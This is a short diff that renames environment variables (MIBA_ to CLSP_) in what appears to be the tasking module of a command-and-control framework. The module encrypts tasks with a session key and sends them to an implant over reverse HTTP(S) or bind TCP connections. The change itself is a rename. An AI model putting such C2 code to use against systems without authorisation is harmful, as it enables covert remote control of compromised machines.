@@ -10,8 +10,8 @@ import random
 
 def call(data: bytes, workerctx=0):
     builder = cmd_builder.CommandBuilder()
-    session_key = eh.ui.GetEnv("MIBA_KEY")
-    next_iv = eh.ui.GetEnv("MIBA_IV")
+    session_key = eh.ui.GetEnv("CLSP_KEY")
+    next_iv = eh.ui.GetEnv("CLSP_IV")
 
     task_rid = random.randint(0, 0xffffffff)
     data = task_rid.to_bytes(4, 'big') + data
@@ -20,12 +20,12 @@ def call(data: bytes, workerctx=0):
     encrypted_data = eh.crypto.EncryptAesData(session_key, next_iv, data)
     parser = response_parser.ResponseParser()
 
-    if eh.ui.GetEnv("MIBA_CONNECTION_TYPE") == "reverse_http" or eh.ui.GetEnv("MIBA_CONNECTION_TYPE") == "reverse_http_ssl":
+    if eh.ui.GetEnv("CLSP_CONNECTION_TYPE") == "reverse_http" or eh.ui.GetEnv("CLSP_CONNECTION_TYPE") == "reverse_http_ssl":
         listener_port = eh.ui.GetEnv("HTTP_LISTENER_PORT")
-        session = eh.ui.GetEnv("MIBA_SESSION")
+        session = eh.ui.GetEnv("CLSP_SESSION")
         encoded = base64.b64encode(encrypted_data)
-        task_result_to = int(eh.ui.GetEnv("MIBA_TASK_RESULT_TIMEOUT"))
-        if eh.ui.GetEnv("MIBA_CONNECTION_TYPE") == "reverse_http_ssl":
+        task_result_to = int(eh.ui.GetEnv("CLSP_TASK_RESULT_TIMEOUT"))
+        if eh.ui.GetEnv("CLSP_CONNECTION_TYPE") == "reverse_http_ssl":
             PROTOCOL_PREFIX = "https"
         else:
             PROTOCOL_PREFIX = "http"
@@ -59,8 +59,8 @@ def call(data: bytes, workerctx=0):
             return
         return parser.dump()
         
-    if eh.ui.GetEnv("MIBA_CONNECTION_TYPE") == "bind_tcp":
-        tcp_connection = int(eh.ui.GetEnv("MIBA_CONNECTION"))
+    if eh.ui.GetEnv("CLSP_CONNECTION_TYPE") == "bind_tcp":
+        tcp_connection = int(eh.ui.GetEnv("CLSP_CONNECTION"))
         builder.add_bstrarg(encrypted_data)
         eh.net.TcpSend(tcp_connection, builder.build_nocmd())
         hdr_size_bytes = eh.net.TcpRecv(tcp_connection, eh.LONG)
